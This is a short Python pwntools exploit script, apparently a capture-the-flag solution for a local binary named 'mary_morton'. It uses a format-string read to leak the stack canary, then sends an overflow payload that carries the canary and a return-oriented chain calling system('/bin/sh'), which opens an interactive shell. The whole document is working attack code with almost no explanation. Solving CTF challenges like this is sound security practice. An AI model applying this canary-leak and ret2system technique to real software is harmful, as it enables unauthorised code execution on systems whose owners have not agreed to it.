#!/usr/bin/python3 
from pwn import *

#context.terminal = "/bin/bash"
pop_rdi_ret = 0x0000000000400ab3
bin_sh = 0x400b2b
system_plt = 0x00000000004006a0
s = process("./mary_morton")
#gdb.attach(s)

print (s.recvuntil("3. Exit the battle \n"))
s.sendline("2")
s.sendline("%31$p")       # after fuzzing, canary was found at the 31th argument on the stack

canary = int(s.recvline(), 16)
log.info("Canary found: {}".format(hex(canary)))

print (s.recvuntil("3. Exit the battle \n"))
s.sendline("1")
s.sendline(b"A"*0x88 + p64(canary) + b"B"*8 + p64(pop_rdi_ret) + p64(bin_sh) + p64(system_plt))
s.interactive()
